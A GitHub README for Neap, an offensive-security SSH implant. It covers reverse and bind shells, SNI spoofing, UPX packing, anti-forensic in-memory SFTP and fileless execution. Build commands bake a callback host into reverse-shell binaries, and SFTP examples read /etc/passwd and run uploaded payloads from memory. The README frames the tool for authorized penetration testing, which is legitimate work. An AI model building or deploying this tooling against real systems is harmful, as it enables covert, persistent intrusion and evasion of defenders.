<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Neap/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Neap/main/docs/assets/logo-light.svg">
  <img alt="Neap" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Neap/main/docs/assets/logo-dark.svg" width="100%">
</picture>

> [!IMPORTANT]
> **Statically-linked SSH server for penetration testing.** Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single static binary. Rust rewrite of [Undertow](https://github.com/Real-Fruit-Snacks/Undertow) with TLS wrapping, SNI spoofing, build-time configuration, auto-daemonization, in-memory SFTP, and SFTP shell via `/exec/`.

> *A neap tide is when high and low water marks are closest — minimal difference, low energy, calm waters. Felt fitting for a tool that operates quietly in the background, maintaining persistent SSH access with minimal detection footprint.*

---

## §1 / Premise

Neap is a **statically-linked SSH server** designed for penetration testing. It provides reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single static binary. This Rust rewrite of [Undertow](https://github.com/Real-Fruit-Snacks/Undertow) adds **TLS wrapping**, **SNI spoofing**, **build-time configuration**, and **auto-daemonization**.

Key innovations include **in-memory SFTP** with zero disk artifacts, **SFTP shell** via `/exec/` paths for command execution through any standard SFTP client, and **fileless execution** using `memfd_create()` on Linux. Build-time configuration bakes connection parameters at compile time — no runtime arguments needed on target.

**Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.

---

## §2 / Specs

| KEY        | VALUE                                                                       |
|------------|-----------------------------------------------------------------------------|
| SHELLS     | **Reverse/bind** · PTY support (Linux openpty/Windows ConPTY)               |
| TRANSPORT  | **SSH-2.0 protocol** · TLS wrapping · SNI spoofing · build-time config      |
| SFTP       | **Disk + in-memory** · upload/download · zero forensic artifacts (memfs)    |
| FORWARDING | **Local/remote/dynamic** · SOCKS5 proxy · full SSH tunnel capabilities      |
| EXECUTION  | **SFTP shell** via `/exec/` · fileless execution · memfd_create on Linux    |
| PLATFORM   | **Linux/Windows** · static binary · musl/MSVC · cross-compile support      |
| STEALTH    | **Auto-daemonize** · TLS HTTPS blending · minimal detection footprint      |
| STACK      | **Rust 1.75+** · static linking · GPLv3                                    |

Architecture in §5 below.

---

## §3 / Quickstart

**Prerequisites:** Rust 1.75+, Cargo

```bash
git clone https://github.com/Real-Fruit-Snacks/Neap.git
cd Neap
make current
```

**Using build.sh (recommended):**

```bash
./build.sh reverse 192.168.1.10:4444
./build.sh listen 8888
./build.sh reverse 10.10.14.5:443 --tls --password "secret"
```

**Cross-compile for Windows targets (from Linux):**

One-time setup:

```bash
rustup target add x86_64-pc-windows-gnu          # 64-bit
rustup target add i686-pc-windows-gnu            # 32-bit (optional)
sudo apt install mingw-w64                       # Debian/Ubuntu/Kali
# or: sudo dnf install mingw64-gcc mingw32-gcc   # Fedora
```

Build:

```bash
# Windows x64 reverse shell
./build.sh reverse 10.10.14.5:4444 --target x86_64-pc-windows-gnu

# Windows x64 bind shell with TLS
./build.sh listen 4444 --target x86_64-pc-windows-gnu --tls

# Windows x86 reverse shell, NOCLI + UPX-compressed
./build.sh reverse 10.10.14.5:443 \
    --target i686-pc-windows-gnu --nocli --compress
```

The output binary is written to `bin/neap_<host>_<port>.exe`.

**Verify:**

```bash
./neap --help
```

---

## §4 / Reference

```
BUILD METHODS

  make current                    Build for current platform
  ./build.sh reverse <host:port>  Reverse shell (dials home)
  ./build.sh listen <port>        Bind shell (listens)
  --tls                          TLS wrapping with SNI spoofing
  --password <pass>              Auth password (baked at compile time)
  --memfs                        In-memory SFTP, zero disk artifacts
  --nocli                        Minimal binary, no help/version
  --compress                     UPX compression
  --target <triple>              Cross-compile (e.g., x86_64-pc-windows-gnu)

RUNTIME USAGE

  neap <host>                    Reverse shell
  neap -p <port> <host>          Reverse shell on port
  neap -l -p <port>              Bind shell (listen)
  neap --memfs -l -p <port>      In-memory SFTP
  neap -v                        Verbose logging

SSH FEATURES

  Shells        Reverse/bind with PTY (openpty/ConPTY)
  SFTP          File transfer + /exec/ shell via paths
  Forwarding    Local/remote/dynamic SOCKS5
  TLS           Optional wrapper, SNI spoofing
  Memfs         RAM-only storage, zero forensics

SFTP SHELL

  sftp> get /exec/whoami /dev/stdout
  sftp> get "/exec/cat /etc/passwd" /dev/stdout
  nexec user@target:4444 "command"    # Helper script

FILELESS EXECUTION

  sftp> put payload /tmp/payload      # Upload to RAM
  nexec user@target:4444 "/tmp/payload"    # Execute from memfd

CROSS-COMPILE SETUP

  rustup target add x86_64-pc-windows-gnu    # Windows x64
  rustup target add i686-pc-windows-gnu      # Windows x86
  sudo apt install mingw-w64                 # Cross-compiler
```

---

## §5 / Architecture

```
src/
├── main.rs          Entry point, CLI parsing, daemonization
├── config.rs        Build-time configuration constants
├── daemon.rs        Auto-daemonize (Unix double-fork / Windows detach)
├── transport.rs     Bind and reverse mode connection logic, TLS wrapping
├── server.rs        SSH server handler, authentication, channel dispatch
├── session.rs       Command execution, environment setup
├── pty/             PTY handling
│   ├── unix.rs      Linux openpty
│   └── windows.rs   Windows ConPTY
├── sftp.rs          SFTP subsystem (disk-backed)
├── memfs.rs         In-memory filesystem for memsftp
├── memsftp.rs       SFTP subsystem (RAM-only, no disk artifacts)
├── exec.rs          /exec/ SFTP shell — run commands via SFTP paths
├── forwarding.rs    Local, remote, and dynamic port forwarding
├── info.rs          System info gathering (reverse mode callback)
└── error.rs         Error types
```

| Layer        | Implementation                                                  |
|--------------|-----------------------------------------------------------------|
| **Modes**    | Bind (server listens) · reverse (client dials home)             |
| **Session**  | Shared SSH-2.0 layer · pluggable subsystems                     |
| **Transport**| TLS wrapping · SNI spoofing · build-time configuration          |
| **SFTP**     | Disk-backed + in-memory · `/exec/` shell integration            |
| **Execution**| PTY shells · fileless via memfd · auto-daemonize                |
| **Build**    | Static linking · cross-compile · UPX compression                |

**Key patterns:** Two-mode architecture with shared SSH session layer. TLS wrapping is transparent and optional. Build-time configuration eliminates runtime arguments. In-memory SFTP provides zero-disk-artifact operation.

---

## §6 / Platform Support

| Capability | Linux | Windows |
|------------|-------|---------|
| Reverse Shell | Full (PTY) | Full (ConPTY) |
| Bind Shell | Full (PTY) | Full (ConPTY) |
| SFTP | Full | Full |
| Port Forwarding | Full | Full |
| TLS Wrapping | Full | Full |
| Auto-Daemonize | Full (double-fork) | Full (detached) |
| In-Memory SFTP | Full | Full |
| SFTP Shell (`/exec/`) | Full | Full |
| Fileless Exec (memfs) | Full (memfd) | Temp file |
| Static Binary | musl | MSVC |

---

[License: GPLv3](LICENSE) · Part of [Real-Fruit-Snacks](https://github.com/Real-Fruit-Snacks) — building offensive security tools, one wave at a time.
